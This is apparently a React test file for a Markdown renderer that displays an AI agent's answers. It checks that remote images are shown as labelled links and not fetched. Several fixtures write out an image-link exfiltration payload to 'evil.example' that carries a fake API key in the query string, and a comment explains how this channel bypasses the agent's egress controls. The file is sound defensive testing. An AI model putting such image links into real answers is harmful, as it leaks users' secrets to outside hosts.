import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import {
  SafeMarkdown,
  addressCarriesData,
  classifyImageSrc,
  localImageQuery,
} from "@/components/markdown/SafeMarkdown";
import { getFsImage } from "@/lib/api";
import { I18nProvider } from "@/lib/i18n";

// The workspace image arrives through the authenticated client, never as a bare `<img src>`.
vi.mock("@/lib/api", () => ({ getFsImage: vi.fn() }));

const originalCreate = URL.createObjectURL;
const originalRevoke = URL.revokeObjectURL;
const created: string[] = [];
const revoked: string[] = [];

beforeEach(() => {
  created.length = 0;
  revoked.length = 0;
  vi.mocked(getFsImage).mockReset();
  vi.mocked(getFsImage).mockResolvedValue(new Blob([new Uint8Array([137, 80, 78, 71])]));
  URL.createObjectURL = vi.fn(() => {
    const url = `blob:${window.location.origin}/fs-${created.length}`;
    created.push(url);
    return url;
  });
  URL.revokeObjectURL = vi.fn((url: string) => {
    revoked.push(url);
  });
});

afterEach(() => {
  URL.createObjectURL = originalCreate;
  URL.revokeObjectURL = originalRevoke;
});

/**
 * An image in an answer is a request the WebView makes on its own, to whatever host the answer
 * names. `![x](https://host/?d=<secret>)` is the classic way to get a secret out of a Markdown
 * renderer, and it bypasses the taint ledger and the egress allowlist, which govern the agent and
 * not the screen. These tests hold the component to: nothing remote is ever mounted as an `<img>`,
 * and the images that are not a request to anybody still render.
 */

// Vitest's jsdom origin, so "this app's own origin" means the same thing to the test and the code.
const ORIGIN = window.location.origin;
const PIXEL = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";

function show(markdown: string) {
  return render(
    <I18nProvider>
      <SafeMarkdown>{markdown}</SafeMarkdown>
    </I18nProvider>,
  );
}

describe("SafeMarkdown", () => {
  it("never mounts a remote image, before or after the person clicks it", async () => {
    const user = userEvent.setup();
    const { container } = show("Done. ![status](https://evil.example/pixel.png?d=sk-live-123)");

    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByTestId("markdown-external-image");
    // The host is named, so the person decides knowing where the request would go.
    expect(link).toHaveTextContent(/external image from evil\.example/i);
    expect(link).toHaveAttribute("href", "https://evil.example/pixel.png?d=sk-live-123");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")).toContain("noreferrer");

    await user.click(link);
    // Opening is the browser's job, outside this page: nothing is fetched into the answer.
    expect(container.querySelector("img")).toBeNull();
  });

  it("renders an image embedded in the answer", () => {
    // react-markdown's default transform empties a data: URL; the image would vanish silently.
    const { container } = show(`![chart](${PIXEL})`);
    expect(container.querySelector("img")).toHaveAttribute("src", PIXEL);
    expect(screen.queryByTestId("markdown-external-image")).toBeNull();
  });

  // This test used to assert that the workspace endpoint was mounted as `<img src="/api/fs/image…">`.
  // That premise stopped being true when the desktop backend began requiring a bearer token on every
  // `/api` request: an `<img>` cannot send one, so the asserted element was a 401 and a broken icon
  // in the real app. What must hold is that the image still renders — through the authenticated
  // client, as a blob URL — and that the bare endpoint is never handed to the element.
  it("renders a blob image, and the workspace image endpoint through the authenticated client", async () => {
    const blob = `blob:${ORIGIN}/0b7d3c4e-1111-2222-3333-444455556666`;
    const { container } = show(`![a](${blob}) ![b](/api/fs/image?path=out/chart.png&workspace=C%3A%2Fw)`);

    await waitFor(() => expect(container.querySelectorAll("img")).toHaveLength(2));
    const srcs = [...container.querySelectorAll("img")].map((img) => img.getAttribute("src"));
    expect(srcs).toEqual([blob, created[0]]);
    expect(getFsImage).toHaveBeenCalledWith("C:/w", "out/chart.png");
    expect(container.querySelector('img[src*="/api/fs/image"]')).toBeNull();
  });

  it("releases the workspace image's blob URL when the answer goes away", async () => {
    const { container, unmount } = show("![b](/api/fs/image?path=out/chart.png)");
    await waitFor(() => expect(container.querySelector("img")).not.toBeNull());
    expect(revoked).toEqual([]);

    unmount();
    expect(revoked).toEqual([created[0]]);
  });

  it("says a workspace image could not be loaded instead of showing a broken icon", async () => {
    vi.mocked(getFsImage).mockRejectedValue(new Error("401 unauthorized"));
    const { container } = show("![b](/api/fs/image?path=out/chart.png)");

    expect(await screen.findByTestId("markdown-local-image-error")).toHaveTextContent(/couldn't load/i);
    expect(container.querySelector("img")).toBeNull();
  });

  it("names a relative path as written instead of mounting it", () => {
    // `chart.png` resolves to this origin, where it is not an image but the app's own page —
    // shown as the file the answer mentioned, not as "an image from 127.0.0.1".
    const { container } = show("![x](chart.png)");
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByTestId("markdown-external-image")).toHaveTextContent("chart.png");
  });

  it("shows the whole address and says when it carries data, not just the host", () => {
    // The chip names the host; `?d=<secret>` is the payload. One click on "external image from
    // evil.example" would deliver it, so the address is in the tooltip and the query is flagged.
    show("![status](https://evil.example/pixel.png?d=sk-live-123)");
    const link = screen.getByTestId("markdown-external-image");
    expect(link.getAttribute("title")).toContain("https://evil.example/pixel.png?d=sk-live-123");
    expect(link.getAttribute("title")).toContain("status");
    expect(screen.getByTestId("markdown-external-image-data")).toHaveTextContent(/carries data/i);
  });

  it("does not flag an address that carries nothing but a location", () => {
    show("![logo](https://example.org/logo.png)");
    expect(screen.getByTestId("markdown-external-image").getAttribute("title")).toContain("https://example.org/logo.png");
    expect(screen.queryByTestId("markdown-external-image-data")).toBeNull();
  });

  it("withholds the workspace endpoint when told to, and still renders embedded bytes", () => {
    // The guest page: this origin's image endpoint is the OWNER's workspace there.
    const { container } = render(
      <I18nProvider>
        <SafeMarkdown allowLocalImages={false}>{`![a](/api/fs/image?path=out/chart.png) ![b](${PIXEL})`}</SafeMarkdown>
      </I18nProvider>,
    );
    const srcs = [...container.querySelectorAll("img")].map((img) => img.getAttribute("src"));
    expect(srcs).toEqual([PIXEL]);
    expect(screen.getByTestId("markdown-withheld-image")).toBeInTheDocument();
    // Not a link either — that would open the owner's file in the guest's browser.
    expect(container.querySelector('a[href*="/api/fs/image"]')).toBeNull();
  });

  it("drops a script URL entirely", () => {
    const { container } = show("![x](javascript:alert(1))");
    expect(container.querySelector("img")).toBeNull();
    expect(screen.queryByTestId("markdown-external-image")).toBeNull();
  });
});

describe("localImageQuery", () => {
  it("reads the path and workspace the endpoint would be asked for", () => {
    expect(localImageQuery("/api/fs/image?path=a%20b.png&workspace=w", ORIGIN)).toEqual({ workspace: "w", path: "a b.png" });
    expect(localImageQuery("/api/fs/image?path=a.png", ORIGIN)).toEqual({ workspace: null, path: "a.png" });
    expect(localImageQuery("/api/fs/image", ORIGIN)).toBeNull();
  });
});

describe("addressCarriesData", () => {
  it("is true for a query or a fragment and false for a bare location", () => {
    expect(addressCarriesData("https://h.example/a.png?d=1", ORIGIN)).toBe(true);
    expect(addressCarriesData("https://h.example/a.png#x", ORIGIN)).toBe(true);
    expect(addressCarriesData("https://h.example/a.png", ORIGIN)).toBe(false);
  });
});

describe("classifyImageSrc", () => {
  it("treats only embedded bytes and this origin's image endpoint as safe to fetch", () => {
    expect(classifyImageSrc("data:image/svg+xml;base64,PHN2Zy8+", ORIGIN)).toEqual({ kind: "inline" });
    expect(classifyImageSrc(`${ORIGIN}/api/fs/image?path=a.png`, ORIGIN)).toEqual({ kind: "local" });
  });

  it("names the host of anything else, however it is spelled", () => {
    expect(classifyImageSrc("//evil.example/x.png", ORIGIN)).toEqual({ kind: "external", label: "evil.example" });
    expect(classifyImageSrc("HTTPS://Evil.Example:8443/x", ORIGIN)).toEqual({ kind: "external", label: "evil.example:8443" });
    // The endpoint's PATH on another origin is still another origin.
    expect(classifyImageSrc("https://evil.example/api/fs/image?path=a.png", ORIGIN)).toEqual({
      kind: "external",
      label: "evil.example",
    });
    // A data: URL that is not an image is not an image.
    expect(classifyImageSrc("data:text/html,<b>x</b>", ORIGIN).kind).toBe("external");
  });
});

// Every source file, verbatim — the same glob the design-system gate reads.
const sources = import.meta.glob("../../**/*.{ts,tsx}", {
  query: "?raw",
  import: "default",
  eager: true,
}) as Record<string, string>;

describe("every answer renderer", () => {
  it("goes through SafeMarkdown, so a new one cannot quietly bring the image channel back", () => {
    // The page policy is the first layer; this keeps the second one from being bypassed by the
    // next screen that renders an answer with a bare `<Markdown>`.
    const direct = Object.entries(sources)
      .filter(([path]) => !/SafeMarkdown(\.test)?\.tsx$/.test(path))
      .filter(([, text]) => /from\s+["']react-markdown["']/.test(text))
      .map(([path]) => path);
    expect(Object.keys(sources).length).toBeGreaterThan(100);
    expect(direct).toEqual([]);
  });
});
